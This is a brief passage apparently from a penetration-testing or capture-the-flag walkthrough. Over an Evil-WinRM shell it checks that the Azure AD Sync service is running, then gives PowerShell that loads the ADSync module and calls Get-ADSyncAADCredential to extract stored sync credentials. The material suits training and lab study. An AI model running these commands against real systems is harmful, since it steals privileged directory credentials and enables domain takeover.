
`Get-Service -Name "ADSync"`

```sh
*Evil-WinRM* PS C:\Users\mhope> Get-Service -Name "ADSync"

Status   Name               DisplayName
------   ----               -----------
Running  ADSync             Microsoft Azure AD Sync
```

try and extract credentials:
```powershell
Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"
$adConnector = Get-ADSyncConnector | Where-Object {$_.Type -eq "AD"}
$aadConnector = Get-ADSyncConnector | Where-Object {$_.Type -eq "AzureActiveDirectory"}
$aadCreds = Get-ADSyncAADCredential -ConnectorId $aadConnector.Identifier
```